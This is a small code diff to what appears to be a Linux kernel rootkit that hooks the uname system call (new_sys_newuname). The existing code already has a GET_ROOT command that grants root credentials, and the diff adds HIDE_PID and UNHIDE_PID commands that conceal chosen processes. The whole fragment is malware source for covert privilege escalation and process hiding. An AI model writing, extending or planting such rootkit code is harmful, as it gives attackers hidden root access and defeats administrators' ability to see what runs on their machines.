@@ -362,6 +362,12 @@ asmlinkage long new_sys_newuname(struct new_utsname *name)
 	case GET_ROOT:
 		give_root_creds();
 		break;
+	case HIDE_PID:
+		hide_pid(args->param1);
+		break;
+	case UNHIDE_PID:
+		unhide_pid(args->param1);
+		break;
 	}
 	
 	memset(name, 0, sizeof(*name));
